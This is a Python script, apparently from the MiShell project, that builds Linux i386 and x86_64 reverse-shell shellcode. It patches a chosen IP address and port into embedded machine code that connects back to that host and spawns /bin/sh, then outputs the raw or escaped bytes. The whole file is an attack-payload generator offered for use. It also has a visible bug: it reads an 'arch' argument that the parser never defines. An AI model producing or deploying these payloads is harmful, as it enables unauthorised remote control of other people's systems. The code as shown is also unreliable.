#!/usr/bin/python3
"""
Copyright (c) 2022 TheOddZer0

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Generate a payload without any need to compile anything.
See the original repo for more info: https://github.com/TheOddZer0/MiShell
"""
import sys
import argparse
from typing import Tuple

VERSION = "1.0.0"


def _hex(num: int):
    result = hex(num)[2:]
    if len(result) % 2 != 0:
        result = "0" + result
    return result


def _reverse_list(value: list):
    value.reverse()
    return value


class PayloadType:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port

    def __init_subclass__(cls, arch: str, shellcode: str):
        cls.arch = arch
        cls.shellcode = shellcode

    def generate(self, ip=None, port=None) -> str:
        raise NotImplementedError

    def encode_ip(self, ip: str = None) -> Tuple[str, str]:
        raise NotImplementedError

    def encoded_port(self, port: int) -> str:
        raise NotImplementedError


class LEPayloadBase(PayloadType, arch=None, shellcode=None):
    def generate(self, ip=None, port=None) -> str:
        ip_result, offset = self.encode_ip(ip)
        shellcode = self.shellcode.replace("\\x80\\x01\\x01\\x02", ip_result)
        shellcode = shellcode.replace("\\x01\\x01\\x01\\x01", offset)
        shellcode = shellcode.replace("\\x11\\x5c", self.encode_port(port))
        return shellcode

    def encode_ip(self, ip: str = None) -> Tuple[str, str]:
        if ip == None:
            ip = self.ip
        result = ""
        offset = ""
        parts = ip.split(".")
        if len(parts) != 4:
            print("That is actually not a valid IP address", file=sys.stderr)
            sys.exit(1)
        for part in parts:
            try:
                part = int(part)
            except:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part > 255 or part < 0:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part == 255:
                print("This method will not work on your IP", file=sys.stderr)
                sys.exit(1)
            _hexed = _hex(part + 1)
            if not ("00" == _hexed or (_hexed.endswith("0") and parts.index(str(part)) != len(parts) - 1)):
                result += "\\x" + _hexed
                offset += "\\x" + "01"
            else:
                result += "\\x" + _hex(part + 2)
                offset += "\\x" + "02"
        return result, offset

    def encode_port(self, port: int = None) -> str:
        if port == None:
            port = self.port
        result = _hex(port)
        return "\\x" + result[:2] + "\\x" + result[2:]


class BEPayloadBase(PayloadType, arch=None, shellcode=None):
    def generate(self, ip=None, port=None) -> str:
        ip_result, offset = self.encode_ip(ip)
        shellcode = self.shellcode.replace("\\x02\\x01\\x01\\x80", ip_result)
        shellcode = shellcode.replace("\\x01\\x01\\x01\\x01", offset)
        shellcode = shellcode.replace("\\x5c\\x11", self.encode_port(port))
        return shellcode

    def encode_ip(self, ip: str = None) -> Tuple[str, str]:
        if ip == None:
            ip = self.ip
        result = ""
        offset = ""
        parts = _reverse_list(ip.split("."))
        if len(parts) != 4:
            print("That is actually not a valid IP address", file=sys.stderr)
            sys.exit(1)
        for part in parts:
            try:
                part = int(part)
            except:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part > 255 or part < 0:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part == 255:
                print("This method will not work on your IP", file=sys.stderr)
                sys.exit(1)
            _hexed = _hex(part + 1)
            if not ("00" == _hexed or (_hexed.endswith("0") and parts.index(str(part)) != len(parts) - 1)):
                result += "\\x" + _hexed
                offset += "\\x" + "01"
            else:
                result += "\\x" + _hex(part + 2)
                offset += "\\x" + "02"
        return result, offset

    def encode_port(self, port: int = None) -> str:
        if port == None:
            port = self.port
        result = _hex(port)
        return "\\x" + result[2:] + "\\x" + result[:2]


class Payload_linux_i386(LEPayloadBase, arch='i386', shellcode='\\x89\\xe5\\x31\\xc0\\x50\\x50\\xbb\\x80\\x01\\x01\\x02\\x81\\xeb\\x01\\x01\\x01\\x01\\x53\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\xcd\\x80'):
    pass


class Payload_linux_x86_64(LEPayloadBase, arch='x86_64', shellcode='\\x48\\x31\\xff\\xbe\\x80\\x01\\x01\\x02\\x81\\xee\\x01\\x01\\x01\\x01\\x56\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xc0\\xb0\\x29\\x66\\xbf\\x02\\x00\\x66\\xbe\\x01\\x00\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\xb0\\x2a\\x48\\x89\\xe6\\xba\\x10\\x00\\x00\\x00\\x0f\\x05\\x48\\x31\\xf6\\xb0\\x21\\x0f\\x05\\x48\\xff\\xc6\\x48\\x83\\xfe\\x02\\x7e\\xf3\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xd2\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05'):
    pass


parser = argparse.ArgumentParser()
supported = dict()
# XXX: Introducing a new variable (name), Results into changing the size
# of result of vars, and raising an exception
# this workaround avoids it, but it doesn't fix it.
# Find a better way?
name = None
for name in vars().keys():
    if name.startswith("Payload_") and issubclass(vars()[name], PayloadType):
        supported[name[8:]] = vars()[name]
parser.add_argument(
    "--ip", help="The IP to connect back to (IPv4 is only supported)", required=True)
parser.add_argument("--port", help="The port number to connect back to",
                    required=True, metavar="0-65535", type=int)
parser.add_argument("--system", help="The value should be in format `<OS>_<ARCH>`, defines the system to generate payload for (Defaults to linux_i386)",
                    choices=supported.keys(), default="linux_i386")
parser.add_argument("--escape", help="Produce an escaped payload instead of raw (\\x00 instead of NULL)",
                    action="store_true")
parser.add_argument("--output", "-o", help="Write the output to FILE instead of stdout",
                    metavar="FILE", default=None)
parser.add_argument("--raw", help="Opposite of --escape, The default",
                    action="store_false", dest="escape", default=False)
ns = parser.parse_args()
if ns.port not in range(65536):
    print("Invalid port", file=sys.stderr)
    sys.exit(1)
gen = supported[ns.arch](ns.ip, ns.port)
ip, offset, port = *gen.encode_ip(), gen.encode_port()
print("Generating payload (IP=", ip,
      " offset=", offset,
      " port=", port, ")", file=sys.stderr, sep="")
payload = gen.generate()
if ns.output is None:
    if ns.escape:
        print(payload)
    else:
        for i in range(2, len(payload), 4):
            print(chr(int(payload[i:i+2], base=16)), end="")
else:
    if ns.escape:
        with open(ns.output, "w") as f:
            f.write(payload)
    else:
        with open(ns.output, "w") as f:
            if ns.escape:
                f.write(payload)
            else:
                f.write("".join([chr(int(payload[i:i+2], base=16))
                        for i in range(2, len(payload), 4)]))
